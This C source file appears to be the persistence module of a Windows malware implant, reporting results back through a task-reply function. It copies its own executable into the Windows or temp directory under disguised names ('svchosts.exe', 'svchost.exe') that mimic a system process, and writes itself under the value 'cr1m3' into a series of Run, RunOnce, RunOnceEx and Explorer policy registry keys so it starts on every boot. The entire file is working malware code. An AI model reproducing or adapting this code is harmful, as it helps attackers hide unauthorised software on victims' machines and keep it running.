#include "windows.h"
#include "api.h"
#include "misc.h"
#include "task_reply.h"
#include "persistence.h"

char persistence_file[2048];

int __persistence(void) {
	int ret;
	
	if(__persistence_disk()==1) {
		__push_reply("Persistence on disk: OK",0x01);
	}

	ret = __persistence_register();

	return(ret);
}

int __persistence_register(void) {
	unsigned long regDisposition;
	HKEY pKey;
	int ret = 0;

	/*
	if(RegCreateKeyExA(HKEY_LOCAL_MACHINE,"Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run",NULL,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition)==0x00) {
		RegSetValueExA(pKey,"cr1m3",NULL,REG_SZ,(const BYTE *)Im,256);
	}
	*/
	//Current Version Run
	if(_RegCreateKeyExA(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",NULL,NULL,0x00,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition)==0x00) {
		_RegSetValueExA(pKey,"cr1m3",0x00,REG_SZ,(const BYTE *)persistence_file,256);
	}
	
	else if(_RegCreateKeyExA(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",NULL,NULL,0L,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition)==0x00) {
		_RegSetValueExA(pKey,"cr1m3",0x00,REG_SZ,(const BYTE *)persistence_file,256);
	}

	else if(_RegCreateKeyExA(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",NULL,NULL,0L,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition)==0x00) {
		_RegSetValueExA(pKey,"cr1m3",0x00,REG_SZ,(const BYTE *)persistence_file,256);
	}

	else if(_RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",NULL,NULL,0L,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition)==0x00) {
		_RegSetValueExA(pKey,"cr1m3",0x00,REG_SZ,(const BYTE *)persistence_file,256);
	}

	else if(_RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",NULL,NULL,0L,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition)==0x00) {
		_RegSetValueExA(pKey,"cr1m3",NULL,REG_SZ,(const BYTE *)persistence_file,256);
	}
	
	else if(_RegCreateKeyExA(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",NULL,NULL,0L,KEY_ALL_ACCESS,NULL,&pKey,&regDisposition)==0x00) {
		_RegSetValueExA(pKey,"cr1m3",NULL,REG_SZ,(const BYTE *)persistence_file,256);
	}

	else {
		return 0;
	}
	return 1;
}


int __persistence_disk(void) {
	char buff[2048];
	char Iam_name[2048];
	char Iam_exe[2048];

	_ZeroMemory(buff, 2048);
	_ZeroMemory(Iam_name, 2048);
	_ZeroMemory(Iam_exe, 2048);

	_GetWindowsDirectoryA(buff, 2048);


	_GetModuleFileNameA(NULL, Iam_name, 2000);
	_lstrcpyA(Iam_exe, __get_last_char_pointer(Iam_name,'\\'));
	
	_ZeroMemory(persistence_file, 2048);
	_lstrcpyA(persistence_file, Iam_name);

	if(_lstrcmpiA(Iam_exe,"svchosts.exe")!=0) {
		return 1;
	}

	_lstrcatA(buff, "\\svchosts.exe");

	if(_lstrcmpiA(buff, Iam_name)==0) {
		_ZeroMemory(persistence_file, 2048);
		_lstrcpyA(persistence_file, buff);
		return 1;
	}

	else {
		if(_PathFileExistsA(buff)==0) {
			if(_CopyFileA(Iam_name, buff, 0)==0x01) {
				_ZeroMemory(persistence_file, 2048);
				_lstrcpyA(persistence_file, buff);
				return 1;
			}
		}
		else {
			_ZeroMemory(persistence_file, 2048);
			_lstrcpyA(persistence_file, buff);
			return 1;
		}
	}

	
	_ZeroMemory(buff, 2048);
	_GetTempPathA(2048, buff);
	_lstrcatA(buff, "svchost.exe");
	if(_lstrcmpiA(buff, Iam_name)==0x00) {
		_ZeroMemory(persistence_file, 2048);
		_lstrcpyA(persistence_file, buff);
		return 1;
	}
	else {
		if(_PathFileExistsA(buff)==0x01) {
			_ZeroMemory(persistence_file, 2048);
			_lstrcpyA(persistence_file, buff);
			return 1;
		}

		if(_CopyFileA(Iam_name, buff, 0)==0x01) {
			_ZeroMemory(persistence_file, 2048);
			_lstrcpyA(persistence_file, buff);
			return 1;
		}
	}

	_ZeroMemory(persistence_file, 2048);
	_lstrcpyA(persistence_file, Iam_name);

	return 0;
}